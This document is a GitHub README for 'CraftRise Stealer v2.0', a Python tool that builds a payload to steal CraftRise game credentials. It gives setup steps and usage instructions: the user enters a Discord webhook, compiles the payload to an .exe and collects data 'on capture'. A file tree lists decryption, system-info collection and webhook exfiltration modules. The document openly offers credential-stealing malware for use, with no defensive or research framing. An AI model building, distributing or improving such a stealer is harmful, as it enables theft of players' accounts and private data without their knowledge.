<p align="center">
  <img src="assets/banner.png" alt="CraftRise Stealer Banner" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.10%2B-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python 3.10+">
  <img src="https://img.shields.io/badge/PyQt5-5.15-41CD52?style=flat-square&logo=qt&logoColor=white" alt="PyQt5">
  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows&logoColor=white" alt="Windows">
  <img src="https://img.shields.io/badge/Version-2.0-d90429?style=flat-square" alt="Version 2.0">
</p>


---

## Requirements

- **Python 3.10** or higher ([Download](https://www.python.org/downloads/))
- **Windows** operating system
- Make sure to check **"Add Python to PATH"** during installation

---

## Installation

1. **Clone or download** the repository:
   ```bash
   git clone https://github.com/Kynarix/Craftrise-Stealer.git
   cd Craftrise-Stealer
   ```

2. **Install dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

3. **Run the application**:
   ```bash
   python run.py
   ```

---

## Usage

1. Enter your **Discord Webhook URL** in the input field.
2. Select your preferred **build options**:
   - Compile to `.exe` (recommended)
   - Enable `@everyone` mention on capture
3. Click **"Build Payload"** and wait for the process to complete.
4. The output file will be located in the `build/` directory.

---

## File Structure

```
Craftrise-Stealer/
├── assets/
│   └── banner.png
├── src/
│   ├── core/
│   │   ├── decryptor.py      # AES/Base64 decryption routines
│   │   ├── system_info.py    # System metadata collector
│   │   └── webhook.py        # Discord webhook dispatcher
│   └── gui/
│       ├── styles.py         # Centralized QSS stylesheet
│       ├── template.py       # Payload template engine
│       ├── builder.py        # PyInstaller build thread
│       └── main_window.py    # Primary application window
├── requirements.txt
├── run.py
└── README.md
```

---

## Credits

<p align="center">
  <strong>Developed by PheXorA</strong><br>
  <a href="https://discord.com/users/phexora">Discord: phexora</a>
</p>

---

<p align="center">
  <sub>CraftRise Stealer v2.0</sub>
</p>
